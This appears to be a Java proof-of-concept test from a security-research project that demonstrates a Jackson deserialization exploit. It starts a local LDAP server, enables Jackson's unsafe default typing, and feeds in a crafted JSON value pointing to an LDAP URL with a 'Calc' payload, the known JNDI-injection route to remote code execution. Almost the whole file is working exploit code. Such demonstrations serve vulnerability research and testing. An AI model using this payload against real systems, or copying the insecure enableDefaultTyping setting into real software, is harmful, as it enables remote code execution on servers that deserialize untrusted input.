package com.security.bug.jackson.test;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.security.bug.common.server.LdapServer;
import java.io.IOException;

/**
 */
public class PocTest {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"\", {\"aaaaa\":\"ldap://localhost:43658/Calc\"}]";
    mapper.readValue(json, Object.class);
  }

}
